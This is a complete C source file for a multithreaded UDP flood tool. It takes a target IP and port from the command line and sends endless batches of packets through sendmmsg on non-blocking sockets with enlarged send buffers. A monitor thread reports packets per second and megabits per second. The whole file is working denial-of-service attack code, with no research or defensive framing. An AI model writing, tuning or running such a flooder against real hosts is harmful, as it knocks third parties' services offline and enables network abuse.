#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <fcntl.h>
#include <time.h>

#define MAX_BATCH 512
#define SO_SNDBUF_SIZE (1024 * 1024 * 4)

int pps_counter = 0;
int mbps_counter = 0;

struct thread_args {
    char ip[64];
    int port;
    int packet_size;
    char* payload;
};

void* monitor_thread(void* arg) {
    (void)arg;

    while (1) {
        sleep(1);

        int pps = __sync_lock_test_and_set(&pps_counter, 0);
        int bytes = __sync_lock_test_and_set(&mbps_counter, 0);

        double mbps = (bytes * 8.0) / 1000000.0;     // Megabits/sec
        double MBps = bytes / 1000000.0;             // Megabytes/sec
        double kbps = (bytes * 8.0) / 1000.0;        // Kilobits/sec

        time_t now = time(NULL);
        struct tm* t = localtime(&now);

        printf(
            "\033[96m[%02d:%02d:%02d] "
            "PPS: %6d | Mb/s: %7.2f | MB/s: %7.2f\033[0m\n",
            t->tm_hour, t->tm_min, t->tm_sec,
            pps, mbps, MBps
        );
        fflush(stdout);
    }

    return NULL;
}

void* udp_flood(void* arg) {
    struct thread_args* args = (struct thread_args*)arg;

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("socket");
        return NULL;
    }

    int sndbuf = SO_SNDBUF_SIZE;
    int enable = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(enable));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    fcntl(sockfd, F_SETFL, O_NONBLOCK);

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &target.sin_addr);

    struct mmsghdr msgs[MAX_BATCH];
    struct iovec iovs[MAX_BATCH];

    for (int i = 0; i < MAX_BATCH; ++i) {
        iovs[i].iov_base = args->payload;
        iovs[i].iov_len = args->packet_size;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &target;
        msgs[i].msg_hdr.msg_namelen = sizeof(target);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
    }

    while (1) {
        int sent = sendmmsg(sockfd, msgs, MAX_BATCH, 0);
        if (sent > 0) {
            __sync_fetch_and_add(&pps_counter, sent);
            __sync_fetch_and_add(&mbps_counter, sent * args->packet_size);
        }
    }

    close(sockfd);
    return NULL;
}

void fill_payload(char* buffer, int size, const char* mode) {
    if (strcmp(mode, "null") == 0) {
        memset(buffer, 0, size);
    } else if (strcmp(mode, "text") == 0) {
        memset(buffer, 'A', size);
    } else if (strcmp(mode, "ascii") == 0) {
        for (int i = 0; i < size; ++i) {
            buffer[i] = (char)(33 + rand() % 94);
        }
    } else {
        for (int i = 0; i < size; ++i) {
            buffer[i] = (char)(rand() % 256);
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 6) {
        printf("Usage: %s <ip> <port> <threads> <packet_size> <payload_mode>\n", argv[0]);
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    char* payload_mode = argv[5];

    printf("\033[96m[*] Target: %s:%d\n[*] Threads: %d | Size: %d | Payload: %s\033[0m\n",
           ip, port, threads, packet_size, payload_mode);

    srand(time(NULL));

    char* payload = mmap(NULL, packet_size, PROT_READ | PROT_WRITE,
                            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (!payload) {
        perror("mmap");
        return 1;
    }
    fill_payload(payload, packet_size, payload_mode);

    pthread_t monitor;
    pthread_create(&monitor, NULL, monitor_thread, NULL);
    pthread_detach(monitor);

    pthread_t th[threads];
    struct thread_args args[threads];

    for (int i = 0; i < threads; ++i) {
        strncpy(args[i].ip, ip, sizeof(args[i].ip) - 1);
        args[i].port = port;
        args[i].packet_size = packet_size;
        args[i].payload = payload;

        pthread_create(&th[i], NULL, udp_flood, &args[i]);
    }

    for (int i = 0; i < threads; ++i) {
        pthread_join(th[i], NULL);
    }

    munmap(payload, packet_size);
    return 0;
}